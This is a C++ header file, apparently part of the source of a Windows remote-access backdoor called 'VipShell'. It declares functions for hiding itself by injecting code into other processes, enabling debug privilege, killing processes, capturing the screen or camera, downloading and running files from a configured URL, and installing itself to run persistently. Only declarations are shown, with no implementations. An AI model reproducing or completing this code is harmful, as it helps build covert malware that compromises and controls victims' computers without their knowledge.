#pragma once
#include "..\vipshellinfo\vipshellcommand.h"
#include ".\startaggregate.h"
#include <windows.h>
#include <vector>
#include ".\opendesktop.h"

	
typedef struct tagVipShellConfig
{
	WCHAR szUrl[256];
	WCHAR szExplain[100];
	WCHAR szCfgFile[100];
	WCHAR szServerName[100];
}VIPSHELLCONFIG, *LPVIPSHELLCONFIG;


DWORD GetCpuInfo();
BOOL GetServerEdition(DWORD* dwMajorVersion, DWORD* dwMinorVersion, DWORD* dwPlatformId);
DWORD GetMemorySize();
bool IsCanCap();

HWND FindCapWnd();
bool enableDebugPriv();
bool GetProcessFilePath(DWORD dwProcessId, LPTSTR szPath, DWORD dwbufflen, bool isGetPath);
DWORD GetProcessToVecTor(std::vector<tagVipShellProcess>* pVecTor);
DWORD GetProcessIdByName(LPCWSTR szName);
BOOL KillProcess(DWORD dwProcessId);

bool SetVipShellConfigExplain(LPCWSTR szEx);
bool SetVipShellConfig(LPCWSTR szFile,	LPVIPSHELLCONFIG pCfg);
bool GetVipShellConfig(LPCWSTR szFile,	LPVIPSHELLCONFIG pCfg);
bool GetVipShellConfig(LPVIPSHELLCONFIG pCfg);
void GetExeFilePath(WCHAR* p);
DWORD Inject
(
 DWORD PID, 
 void* pfnRemoteFunc, 
 DWORD dwFuncSize, 
 void* pRemoteParam, 
 DWORD dwParamSize,
 DWORD dwMilliseconds 
 //等待远线程结束:INFINITE:无限等待,结束后释放远线程内存(用于非阻塞函数)
 //如果为0,不等待而直接返回,而且不释放远线程内存(用于阻塞函数)
);
typedef HINSTANCE	(__stdcall *PLoadLibraryA)( LPCSTR );
typedef FARPROC		(__stdcall *PGetProcAddress)( HMODULE, LPCSTR );
typedef BOOL		(__stdcall *PFreeLibrary)( HINSTANCE );
typedef HINSTANCE	(__stdcall *PGetModuleHandle)( LPCSTR );
typedef	VOID		(__stdcall *PExitProcess)(UINT);

typedef struct tagThreadParam
{	
    PLoadLibraryA	pfnLoadLibraryA;
    PGetProcAddress	pfnGetProcAddress;
    PFreeLibrary	pfnFreeLibrary;
    PGetModuleHandle    pfnGetModuleHandle;
    //char szKernel32[36];
    char szDllName[MAX_PATH];
    char szFunctionName[MAX_PATH];
	VIPSHELLCONFIG lp;
    
}ThreadParam, *PThreadParam;
void InjectHideMe(DWORD dwProcessId, LPVIPSHELLCONFIG lp, LPCSTR szFnName);

void KeyDownCtrlAltDel();
bool RunFile(LPCWSTR szFile, LPCWSTR szlp = NULL, LPCWSTR szDir = NULL, DWORD dwShow = SW_SHOW);
bool DownFile(LPCWSTR szUrl, LPCWSTR szPath , std::wstring* pRet = NULL);
void GetNameByFullPath(LPCWSTR szFile, std::wstring* strName = NULL, std::wstring* strPath = NULL);
void CreateThreadDownFile(LPCWSTR szUrl);
void MakeRun(LPCWSTR szFile, LPCWSTR szServerName, bool bIsRun = true);
void StopServer();

